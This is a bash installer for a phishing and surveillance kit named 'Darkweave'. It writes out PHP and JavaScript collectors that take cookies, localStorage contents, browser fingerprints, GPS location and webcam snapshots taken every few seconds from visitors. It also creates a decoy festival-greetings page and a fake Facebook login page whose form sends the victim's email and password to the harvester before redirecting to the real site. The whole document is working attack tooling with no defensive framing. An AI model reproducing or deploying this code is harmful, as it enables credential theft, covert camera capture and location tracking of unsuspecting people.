#!/bin/bash
# Darkweave Main Installer

GREEN='\033[0;32m'
NC='\033[0m'

echo "========================================="
echo "  Darkweave Framework Setup"
echo "========================================="

# Create all necessary files
cat > php/harvest.php << 'PHPEOF'
<?php
$data_dir = __DIR__ . '/../output/';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

// Handle POST data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) {
        $log_file = $data_dir . strtolower(str_replace(' ', '_', $input['type'])) . '.txt';
        $log_entry = "[$timestamp] IP: $ip\n";
        $log_entry .= print_r($input['data'], true) . "\n---\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);
        echo json_encode(['status' => 'ok']);
        exit;
    }
}

// Handle GET requests
if (isset($_GET['type']) && isset($_GET['data'])) {
    $log_file = $data_dir . 'stealth_' . date('Ymd') . '.txt';
    $log_entry = "[$timestamp] IP: $ip | Type: {$_GET['type']} | Data: {$_GET['data']}\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    echo "OK";
    exit;
}

// Handle image uploads
if (isset($_FILES['image'])) {
    $filename = $data_dir . 'cam_' . date('Ymd_His') . '.png';
    move_uploaded_file($_FILES['image']['tmp_name'], $filename);
    echo json_encode(['status' => 'ok']);
    exit;
}

echo json_encode(['status' => 'error']);
?>
PHPEOF

cat > php/ip.php << 'PHPEOF'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$data = "IP: $ip\nUser-Agent: $ua\nTime: " . date('Y-m-d H:i:s') . "\n";
file_put_contents(__DIR__ . '/../output/ip.txt', $data);
?>
PHPEOF

cat > js/collector.js << 'JSEOF'
// Darkweave Data Collector
(function() {
    const server = window.location.origin;
    
    function send(type, data) {
        fetch(server + '/php/harvest.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({type: type, data: data})
        }).catch(() => {});
    }
    
    // Collect cookies
    if (document.cookie) {
        send('cookies', document.cookie);
    }
    
    // Collect localStorage
    if (window.localStorage) {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage[key] = localStorage.getItem(key);
        }
        if (Object.keys(storage).length) send('localstorage', storage);
    }
    
    // Collect fingerprint
    send('fingerprint', {
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory
    });
    
    // Collect location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            send('gps', {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            });
        });
    }
    
    // Camera capture
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    if (video.videoWidth) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            const fd = new FormData();
                            fd.append('image', blob);
                            fetch(server + '/php/harvest.php', {method: 'POST', body: fd});
                        });
                    }
                }, 3000);
            }).catch(() => {});
    }
})();
JSEOF

cat > templates/index.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loading...</title>
    <style>
        body {
            background: #0a0e27;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: monospace;
        }
        .loader {
            text-align: center;
            color: #00ff00;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #333;
            border-top: 3px solid #0f0;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
    <?php include '../php/ip.php'; ?>
    <script src="../js/collector.js"></script>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Establishing secure connection...</p>
    </div>
    <script>
        setTimeout(() => {
            window.location.href = 'festival.html';
        }, 3000);
    </script>
</body>
</html>
HTML

cat > templates/festival.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>🎉 Festival Wishes 🎉</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 1s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .emoji { font-size: 60px; animation: bounce 1s infinite; }
        @keyframes bounce {
            0%,100%{transform:translateY(0)}
            50%{transform:translateY(-10px)}
        }
        h1 { color: #667eea; margin: 20px 0 10px; }
        p { color: #666; line-height: 1.6; }
        .btn {
            display: inline-block;
            background: #25D366;
            color: white;
            padding: 12px 30px;
            border-radius: 30px;
            text-decoration: none;
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
    <script src="../js/collector.js"></script>
</head>
<body>
    <div class="card">
        <div class="emoji">🎉✨🎊</div>
        <h1>Happy Festival!</h1>
        <p>Wishing you joy, prosperity, and endless happiness!</p>
        <p style="margin-top: 15px;">🌸 May this festival bring beautiful moments 🌸</p>
        <a href="#" class="btn">📱 Share Wishes</a>
    </div>
</body>
</html>
HTML

cat > templates/facebook.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 400px;
            text-align: center;
        }
        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .error { color: red; font-size: 12px; margin-top: 10px; display: none; }
    </style>
    <script src="../js/collector.js"></script>
</head>
<body>
    <div class="login-box">
        <h1>facebook</h1>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Phone Number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <div class="error" id="error">Incorrect credentials. Please try again.</div>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            await fetch('../php/harvest.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'credentials', data: { email, password } })
            });
            
            document.getElementById('error').style.display = 'block';
            setTimeout(() => {
                window.location.href = 'https://www.facebook.com';
            }, 2000);
        });
    </script>
</body>
</html>
HTML

cat > config/settings.json << 'EOF'
{
    "version": "1.0",
    "name": "Darkweave",
    "author": "CyberRoninX1",
    "features": {
        "cookies": true,
        "location": true,
        "camera": true,
        "fingerprint": true,
        "storage": true
    }
}
EOF

# Create output directory
mkdir -p output
touch output/.gitkeep

echo -e "${GREEN}[✓] Darkweave installed successfully!${NC}"
echo -e "${GREEN}[✓] Run: ./launch.sh${NC}"
